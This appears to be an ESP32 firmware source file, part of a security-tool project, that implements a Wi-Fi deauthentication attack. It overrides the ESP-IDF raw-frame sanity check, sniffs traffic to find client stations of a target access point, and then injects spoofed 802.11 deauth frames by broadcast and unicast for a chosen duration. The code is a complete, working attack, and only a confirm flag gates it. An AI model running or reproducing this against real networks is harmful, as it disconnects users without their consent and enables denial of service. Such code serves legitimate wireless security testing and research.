/**
 * wifi_deauth runner — spec §6.4 extended capability, deliverable §11.8.
 *
 * Constructs and transmits IEEE 802.11 deauthentication management frames
 * via the ESP-IDF esp_wifi_80211_tx() API.  Technique follows ESP32-Bit-Pirate's
 * WifiService::deauthAttack() (MIT license, see firmware/NOTICE).
 *
 * Two-phase operation:
 *   Phase 1 — Promiscuous sniff to discover connected client stations
 *   Phase 2 — Raw frame injection: broadcast deauth + unicast per client
 *
 * Radio interaction: uses the same disconnect sequence as wifi_survey (spec §6.1).
 * The caller (worker task) handles the MQTT disconnect/reconnect lifecycle;
 * this runner only touches the radio during the attack window.
 */

#include "wifi_deauth.h"

#include <cstring>
#include <array>
#include <esp_wifi.h>
#include <WiFi.h>

// ---------------------------------------------------------------------------
// Sanity-check override.  ESP-IDF's internal ieee80211_raw_frame_sanity_check()
// rejects raw frame injection by default.  Returning 0 permits esp_wifi_80211_tx()
// to transmit arbitrary 802.11 frames.  This is the identical technique used by
// ESP32-Bit-Pirate (src/Services/WifiService.cpp) and dozens of other open-source
// ESP32 security tools.
// ---------------------------------------------------------------------------
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

// ---------------------------------------------------------------------------
// Phase 1: client station discovery via promiscuous sniffing
// ---------------------------------------------------------------------------

static uint8_t s_targetBssid[6];
static std::array<uint8_t, 6> s_clientList[MAX_DEAUTH_CLIENTS];
static volatile size_t s_clientCount = 0;
static portMUX_TYPE s_clientMux = portMUX_INITIALIZER_UNLOCKED;

/**
 * Promiscuous RX callback for client discovery.
 *
 * Listens for data frames where To-DS=1 and From-DS=0 (station → AP).
 * If the destination (Addr1) matches the target BSSID, the source (Addr2)
 * is a connected client station.  We record unique client MACs.
 *
 * Frame Control bits (802.11 header byte 1, low 2 bits):
 *   To-DS=1, From-DS=0  →  (hdr[1] & 0x03) == 0x01
 * Address layout for To-DS=1:
 *   Addr1 (bytes 4–9)   = BSSID (destination AP)
 *   Addr2 (bytes 10–15) = Source (client station)
 */
static void clientSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* pkt =
        reinterpret_cast<const wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* hdr = pkt->payload;

    // To-DS = 1, From-DS = 0
    if ((hdr[1] & 0x03) != 0x01) return;

    const uint8_t* ap  = hdr + 4;   // Addr1 = BSSID
    const uint8_t* sta = hdr + 10;  // Addr2 = client

    // Must match our target AP
    if (memcmp(ap, s_targetBssid, 6) != 0) return;

    portENTER_CRITICAL_ISR(&s_clientMux);
    // Check if already seen
    bool seen = false;
    for (size_t i = 0; i < s_clientCount; i++) {
        if (memcmp(s_clientList[i].data(), sta, 6) == 0) {
            seen = true;
            break;
        }
    }
    if (!seen && s_clientCount < MAX_DEAUTH_CLIENTS) {
        memcpy(s_clientList[s_clientCount].data(), sta, 6);
        s_clientCount++;
    }
    portEXIT_CRITICAL_ISR(&s_clientMux);
}

// ---------------------------------------------------------------------------
// Phase 2: deauthentication frame construction and injection
// ---------------------------------------------------------------------------

/**
 * IEEE 802.11 Deauthentication frame template (26 bytes).
 *
 * Byte layout:
 *   [0-1]   Frame Control: 0xC0, 0x00  (Type 0 = Management, Subtype 12 = Deauth)
 *   [2-3]   Duration: 0x00, 0x00
 *   [4-9]   Addr1: Destination (target client MAC, or FF:FF:FF:FF:FF:FF for broadcast)
 *   [10-15] Addr2: Source (spoofed as the AP's BSSID)
 *   [16-21] Addr3: BSSID (the AP)
 *   [22-23] Sequence Control: 0x00, 0x00
 *   [24-25] Reason Code: 0x02, 0x00  ("Previous authentication no longer valid")
 */
static const uint8_t DEAUTH_FRAME_TEMPLATE[26] = {
    0xC0, 0x00,                         // Frame Control (Deauth)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 = destination (placeholder)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 = source AP (placeholder)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3 = BSSID (placeholder)
    0x00, 0x00,                         // Sequence Control
    0x02, 0x00                          // Reason code: 2
};

/**
 * Send one deauth burst: broadcast + unicast to each discovered client.
 * Returns the number of frames successfully transmitted.
 */
static uint32_t sendDeauthBurst(const uint8_t bssid[6]) {
    uint8_t pkt[26];
    uint32_t sent = 0;

    memcpy(pkt, DEAUTH_FRAME_TEMPLATE, 26);
    // Addr2 = AP BSSID (source, spoofed)
    memcpy(pkt + 10, bssid, 6);
    // Addr3 = BSSID
    memcpy(pkt + 16, bssid, 6);

    // Broadcast deauth (Addr1 = FF:FF:FF:FF:FF:FF, already in template)
    memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, true) == ESP_OK) {
        sent++;
    }

    // Unicast deauth to each discovered client station
    portENTER_CRITICAL(&s_clientMux);
    size_t count = s_clientCount;
    portEXIT_CRITICAL(&s_clientMux);

    for (size_t i = 0; i < count; i++) {
        memcpy(pkt + 4, s_clientList[i].data(), 6);  // Addr1 = client
        if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, true) == ESP_OK) {
            sent++;
        }
    }

    return sent;
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

bool runWifiDeauth(const DeauthArgs& args, DeauthResult& result) {
    // Safety interlock: refuse without explicit confirmation (spec §6.4)
    if (!args.confirm) {
        return false;
    }

    memset(&result, 0, sizeof(result));
    memcpy(result.target_bssid, args.target_bssid, 6);
    result.channel = args.channel;

    uint32_t startMs = millis();

    // --- Enter AP mode for raw frame TX ---
    WiFi.mode(WIFI_MODE_AP);
    esp_wifi_start();
    esp_wifi_set_channel(args.channel, WIFI_SECOND_CHAN_NONE);

    // --- Phase 1: discover connected clients ---
    memcpy(s_targetBssid, args.target_bssid, 6);
    s_clientCount = 0;

    esp_wifi_set_promiscuous_rx_cb(clientSnifferCb);
    esp_wifi_set_promiscuous(true);

    // Sniff for 400ms to find active stations
    uint32_t sniffStart = millis();
    while (millis() - sniffStart < 400) {
        delay(1);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    portENTER_CRITICAL(&s_clientMux);
    result.clients_found = static_cast<uint16_t>(s_clientCount);
    portEXIT_CRITICAL(&s_clientMux);

    // --- Phase 2: send deauth bursts for the requested duration ---
    uint32_t totalFrames = 0;
    uint32_t deadline = startMs + (args.duration_s * 1000);
    uint8_t burstsPerRound = args.bursts > 0 ? args.bursts : 5;

    while (millis() < deadline) {
        for (uint8_t b = 0; b < burstsPerRound; b++) {
            totalFrames += sendDeauthBurst(args.target_bssid);
        }
        delay(10);  // Small pause between rounds to avoid watchdog
    }

    result.frames_sent = totalFrames;
    result.duration_ms = millis() - startMs;

    // Radio cleanup — caller handles WiFi reassociation and MQTT reconnect
    esp_wifi_stop();

    return true;
}
